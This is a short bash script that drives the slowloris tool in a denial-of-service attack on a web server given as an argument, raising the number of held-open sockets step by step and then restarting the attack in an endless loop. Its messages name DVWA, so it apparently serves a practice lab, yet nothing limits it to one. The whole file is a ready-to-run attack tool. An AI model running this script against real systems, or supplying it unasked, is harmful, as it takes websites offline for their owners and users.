#!/bin/bash
TARGET_URL="$1"
MAX_SOCKETS="${2:-500}"
SLEEPTIME="${3:-5}"

if [ -z "$TARGET_URL" ]; then
  echo "Usage: ./dos_attack.sh <target_url> [max_sockets] [sleeptime]"
  exit 1
fi
TARGET_HOST=$(echo "$TARGET_URL" | sed -e 's|^[^/]*//||' -e 's|/.*$||' -e 's|:.*$||')

echo "[*] Running Slowloris DoS attack against DVWA"
echo "[*] Target host: $TARGET_HOST"
echo "[*] Target URL: $TARGET_URL"
echo "[*] Progressive attack from 50 to $MAX_SOCKETS sockets"
CURRENT_SOCKETS=300
INCREMENT=75
WAIT_TIME=8

while [ $CURRENT_SOCKETS -le $MAX_SOCKETS ]; do
  echo "[+] Escalating to $CURRENT_SOCKETS sockets..."
  slowloris "$TARGET_HOST" -p 80 -s "$CURRENT_SOCKETS" --sleeptime "$SLEEPTIME" &
  SLOWLORIS_PID=$!
  sleep $WAIT_TIME
  if [ $CURRENT_SOCKETS -lt $MAX_SOCKETS ]; then
    kill $SLOWLORIS_PID 2>/dev/null
    CURRENT_SOCKETS=$((CURRENT_SOCKETS + INCREMENT))
  else

    echo "[+] Maximum reached: $MAX_SOCKETS sockets - maintaining attack..."
    break
  fi
done
while true; do
  slowloris "$TARGET_HOST" -p 80 -s "$MAX_SOCKETS" --sleeptime "$SLEEPTIME"
  echo "[!] Slowloris exited, restarting..."
  sleep 2
done
